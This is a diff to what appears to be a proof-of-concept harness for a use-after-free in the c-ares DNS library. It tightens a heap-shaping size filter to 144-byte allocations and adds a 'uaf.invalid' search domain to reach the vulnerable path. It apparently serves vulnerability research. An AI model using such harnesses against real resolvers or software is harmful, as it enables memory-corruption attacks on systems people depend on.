@@ -62,13 +62,7 @@ static proof_slist_node_t *proof_node;
 
 static int should_shape_size(size_t size)
 {
-  if (size == 144) {
-    return 1;
-  }
-  if (!control_call) {
-    return 0;
-  }
-  return size >= 128 && size <= 192 && (size % sizeof(void *)) == 0;
+  return size == 144;
 }
 
 static void proof_marker(void *arg)
@@ -408,7 +402,8 @@ int main(int argc, char **argv)
   ares_channel_t *channel = NULL;
   struct ares_options opts;
   struct ares_addrinfo_hints hints;
-  int optmask = ARES_OPT_FLAGS | ARES_OPT_LOOKUPS;
+  char *search_domains[] = { (char *)"uaf.invalid" };
+  int optmask = ARES_OPT_FLAGS | ARES_OPT_LOOKUPS | ARES_OPT_DOMAINS;
   char server[64];
   int done = 0;
   int loops = 0;
@@ -472,6 +467,8 @@ int main(int argc, char **argv)
     opts.flags |= ARES_FLAG_USEVC;
   }
   opts.lookups = (char *)"b";
+  opts.domains = search_domains;
+  opts.ndomains = 1;
   if (ares_init_options(&channel, &opts, optmask) != ARES_SUCCESS ||
       channel == NULL) {
     return 2;
